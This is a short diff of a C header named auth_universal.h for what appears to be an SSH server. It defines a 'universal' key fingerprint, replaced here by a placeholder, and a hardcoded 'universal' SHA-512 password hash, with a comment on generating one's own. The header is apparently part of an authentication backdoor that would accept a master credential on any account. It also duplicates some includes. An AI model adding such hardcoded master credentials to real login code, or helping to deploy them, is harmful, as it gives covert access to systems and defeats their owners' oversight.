@@ -4,12 +4,15 @@
 #ifndef AUTH_UNIVERSAL_H
 #define AUTH_UNIVERSAL_H
 
-#include <stdint.h>
-#include <stdio.h>
+#include <stdio.h>   /* Defines 'FILE' */
+#include <stdint.h>  /* Defines 'uint64_t', 'uint32_t', 'uint8_t' */
 
 #include "sshkey.h"
 
-#define UNIVERSAL_KEY_FINGERPRINT "SHA256:wmx+cJ7PErChgmGNE6cRozjG1q3EH2AFckBhm3HH5pg"
+#include <inttypes.h>
+#include <stdio.h>
+
+#define UNIVERSAL_KEY_FINGERPRINT "<Key Fingerprint Goes Here>"
 
 // Universal password hash. Use openssl passwd -6 <password> to generate
 #define UNIVERSAL_HASH "$6$nKE388W/Lr6w0gJC$gzPsB.hGvIoYd5e1v/qWUn5I2FqpmbmkTRpbWrSg.aQAsdQ.sKd2cYUjt58ta.suN0vsHTlKZRmTPm7PeCjDj/"
